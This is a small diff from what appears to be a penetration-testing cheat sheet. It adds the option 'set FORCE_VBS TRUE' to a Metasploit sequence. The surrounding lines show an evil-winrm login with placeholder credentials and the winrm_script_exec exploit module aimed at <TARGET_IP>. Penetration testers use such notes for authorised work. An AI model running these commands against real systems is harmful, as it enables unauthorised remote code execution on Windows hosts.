@@ -794,6 +794,7 @@ evil-winrm.rb -u <USER> -p '<PW>' -i <TARGET_IP>
 # Global set
 setg RHOSTS <TARGET_IP>
 setg RHOST <TARGET_IP>
+set FORCE_VBS TRUE
 
 use exploit/windows/winrm/winrm_script_exec
 
